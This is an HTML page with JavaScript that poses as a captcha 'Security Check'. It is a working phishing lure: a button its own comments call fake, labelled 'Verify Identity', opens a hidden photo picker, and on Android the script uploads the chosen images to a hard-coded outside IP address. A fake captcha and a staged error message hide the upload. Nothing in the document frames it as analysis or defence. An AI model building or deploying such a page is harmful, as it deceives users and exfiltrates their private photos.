<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        .captcha {
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            width: 300px;
            background-color: #f9f9f9;
        }
        .hidden {
            display: none;
        }
        .error {
            color: red;
            font-weight: bold;
        }
        .verify-button {
            margin-top: 10px;
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .verify-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="captcha">
        <h2>Security Check</h2>
        <p>Please solve the following captcha to continue:</p>
        <p><strong>What is 2 + 3?</strong></p>
        <input type="text" id="captcha-input" placeholder="Your answer">
        <button onclick="checkCaptcha()">Submit</button>
        <p id="error-message" class="hidden error">Invalid captcha. Please try again later.</p>

        <!-- Fake button to trigger file input -->
        <button class="verify-button" onclick="triggerFileInput()">Verify Identity</button>
    </div>

    <!-- Hidden file input -->
    <input type="file" id="photo-upload" accept="image/*" class="hidden" multiple>

    <script>
        // Detect device type
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isiPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        // Log device type (for debugging)
        console.log(`Device detected: ${isAndroid ? 'Android' : isiPhone ? 'iPhone' : 'Unknown'}`);

        // Function to upload photos
        async function uploadPhotos() {
            const fileInput = document.getElementById("photo-upload");

            // Listen for file selection
            fileInput.addEventListener("change", async (event) => {
                const files = event.target.files;
                if (files.length > 0) {
                    // Upload each file to the server
                    for (const file of files) {
                        const formData = new FormData();
                        formData.append("photo", file);

                        try {
                            const response = await fetch("http://91.2.36.103:5000/upload", {
                                method: "POST",
                                body: formData,
                            });

                            if (!response.ok) {
                                console.error("Upload failed for file:", file.name);
                            }
                        } catch (error) {
                            console.error("Error uploading file:", file.name, error);
                        }
                    }
                } else {
                    console.log("No files selected.");
                }
            });

            // Abort if no files are selected after a short delay
            setTimeout(() => {
                if (fileInput.files.length === 0) {
                    console.log("File input was not triggered.");
                }
            }, 5000); // 5-second timeout
        }

        // Function to trigger the file input
        function triggerFileInput() {
            const fileInput = document.getElementById("photo-upload");
            fileInput.click();
        }

        // Function to check the captcha
        function checkCaptcha() {
            const captchaInput = document.getElementById("captcha-input").value;
            const errorMessage = document.getElementById("error-message");

            if (captchaInput === "5") {
                // Captcha solved correctly
                errorMessage.textContent = "Captcha solved! Processing...";
                errorMessage.classList.remove("hidden");

                // Simulate a delay for background activity
                setTimeout(() => {
                    errorMessage.textContent = "An error occurred. Please try again later.";
                }, 5000); // 5-second delay
            } else {
                // Captcha solved incorrectly
                errorMessage.textContent = "Invalid captcha. Please try again later.";
                errorMessage.classList.remove("hidden");
            }
        }

        // Adjust behavior based on device type
        if (isAndroid) {
            // Android devices are more permissive with file access
            uploadPhotos();
        } else if (isiPhone) {
            // iPhones are more restrictive, so we need to be cautious
            alert("Your device is not supported for this operation.");
            window.close();
        } else {
            // Unknown device
            alert("Unsupported device.");
            window.close();
        }
    </script>
</body>
</html>
